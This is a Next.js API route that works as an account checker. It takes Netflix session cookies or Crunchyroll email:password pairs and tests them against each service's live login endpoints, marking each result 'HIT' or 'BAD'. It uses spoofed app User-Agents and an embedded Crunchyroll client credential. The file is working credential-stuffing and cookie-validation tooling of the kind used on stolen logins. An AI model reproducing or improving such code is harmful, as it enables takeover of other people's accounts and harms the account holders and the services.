import { NextResponse } from "next/server";

export const dynamic = "force-dynamic";

export async function POST(request) {
  try {
    const body = await request.json();
    const { type, content } = body;

    if (!content || !content.trim()) {
      return NextResponse.json({ success: false, error: "Content cannot be empty" }, { status: 400 });
    }

    const input = content.trim();

    if (type === "netflix_cookie") {
      // Extract NetflixId
      let netflixId = null;
      let secureNetflixId = null;

      // Netscape or JSON check
      if (input.startsWith("[") && input.endsWith("]")) {
        try {
          const parsed = JSON.parse(input);
          for (const c of parsed) {
            if (c.name === "NetflixId") netflixId = c.value;
            if (c.name === "SecureNetflixId") secureNetflixId = c.value;
          }
        } catch {
          // ignore
        }
      }

      if (!netflixId) {
        const netMatch = input.match(/NetflixId\s+([^\s\n\r]+)/i) || input.match(/NetflixId=([^;\s\n\r]+)/i);
        if (netMatch) netflixId = netMatch[1];
      }

      if (!netflixId) {
        return NextResponse.json({
          success: false,
          status: "BAD",
          message: "No NetflixId cookie could be extracted from input.",
        });
      }

      // Check cookie via Netflix iOS endpoint
      try {
        const checkUrl = "https://ios.prod.ftl.netflix.com/iosui/user/latest";
        const res = await fetch(checkUrl, {
          headers: {
            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
            Cookie: `NetflixId=${netflixId}`,
          },
        });

        if (res.status === 401 || res.status === 403) {
          return NextResponse.json({
            success: true,
            status: "BAD",
            message: `Expired or Invalid Cookie (Status: ${res.status})`,
          });
        }

        return NextResponse.json({
          success: true,
          status: "HIT",
          message: "Valid Cookie detected! Authentication successful.",
          data: {
            service: "Netflix",
            statusCode: res.status,
            cookiePreview: netflixId.substring(0, 18) + "...",
          },
        });
      } catch (err) {
        return NextResponse.json({
          success: false,
          status: "ERROR",
          message: `Network/API Error: ${err.message}`,
        });
      }
    }

    if (type === "crunchyroll") {
      // Crunchyroll Combo/Cookie check
      const parts = input.split(":");
      if (parts.length >= 2) {
        const email = parts[0].trim();
        const password = parts.slice(1).join(":").trim();

        try {
          const authUrl = "https://beta-api.crunchyroll.com/auth/v1/token";
          const res = await fetch(authUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              Authorization: "Basic cmpzMGx0eDBkYndrbGl3eGR6ZGY6NFY3cmYyMS1VRlhlWi01WUFkMFhfUVB3cjFndV9pMXM=",
              "User-Agent": "Crunchyroll/ANDROIDTV/3.65.0_22347",
            },
            body: new URLSearchParams({
              username: email,
              password: password,
              grant_type: "password",
              scope: "offline_access",
            }),
          });

          const data = await res.json();
          if (res.ok && data.access_token) {
            return NextResponse.json({
              success: true,
              status: "HIT",
              message: `Crunchyroll Login Successful for ${email}!`,
              data: {
                service: "Crunchyroll",
                email: email,
                token: data.access_token.substring(0, 15) + "...",
              },
            });
          } else {
            return NextResponse.json({
              success: true,
              status: "BAD",
              message: `Login failed for ${email}: ${data.message || data.error || "Invalid Credentials"}`,
            });
          }
        } catch (err) {
          return NextResponse.json({
            success: false,
            status: "ERROR",
            message: `Crunchyroll API Error: ${err.message}`,
          });
        }
      }
    }

    return NextResponse.json({
      success: true,
      status: "CHECKED",
      message: "Processed input successfully.",
      data: { type, length: input.length },
    });
  } catch (err) {
    console.error("Checker API Error:", err);
    return NextResponse.json({ success: false, error: err.message }, { status: 500 });
  }
}
